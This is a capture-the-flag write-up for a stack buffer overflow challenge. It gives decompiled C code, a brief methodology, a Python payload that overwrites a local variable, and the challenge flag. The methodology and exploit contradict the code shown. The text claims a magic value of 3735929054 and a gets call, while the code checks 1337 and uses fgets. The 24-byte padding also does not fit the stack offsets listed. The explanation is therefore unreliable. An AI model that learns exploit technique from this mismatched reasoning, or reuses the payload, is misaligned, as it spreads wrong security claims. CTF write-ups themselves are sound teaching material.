# Challenge name: A Kind of Magic

### Description
You're a magic man aren't you? Well can you show me?

## Decompiled code
```assembly
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[44]; // [rsp+10h] [rbp-30h] BYREF
  unsigned int v5; // [rsp+3Ch] [rbp-4h]

  v5 = 0;
  puts("Is this a kind of magic? What is your magic?: ");
  fflush(_bss_start);
  fgets(s, 64, stdin);
  printf("You entered %s\n", s);
  printf("Your magic is: %d\n", v5);
  fflush(_bss_start);
  if ( v5 == 1337 )
  {
    puts("Whoa we got a magic man here!");
    fflush(_bss_start);
    system("cat flag.txt");
  }
  else
  {
    puts("You need to challenge the doors of time");
    fflush(_bss_start);
  }
  return 0;
}
```

### Methodology
From the code, we can see that `v5` is set to 0 but in line 11 it check `if v5 == 3735929054`, user's input is `v4` and the program use `gets` which is not check the input. So this challenge is a stackoverflow challenge.

## Exploit

![image](https://user-images.githubusercontent.com/69805864/134918553-62e3748f-ebe1-44e5-876e-73b323f08593.png)
 Via the assembly code above, we have a stack like this:
 
 ![image](https://user-images.githubusercontent.com/69805864/134919113-6398147e-1f48-48b9-9f80-7a02a17d0a72.png)

So our input should be have first 24 bytes for padding and last 8 bytes to override `v5` which is `\xde\xc0\xad\xde\x00\x00\x00\x00` because linux use little endian.

### Exploit code

```
exploit = "0"*24
exploit += "\xde\xc0\xad\xde\x00\x00\x00\x00"
print(exploit)
print("cat flag.txt")
```

Run the code and we wil get the flag
![image](https://user-images.githubusercontent.com/69805864/134920984-789b16d3-e0f5-4ec5-8af0-9a1decd12873.png)

## Flag
DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}



# ==========================================================================================
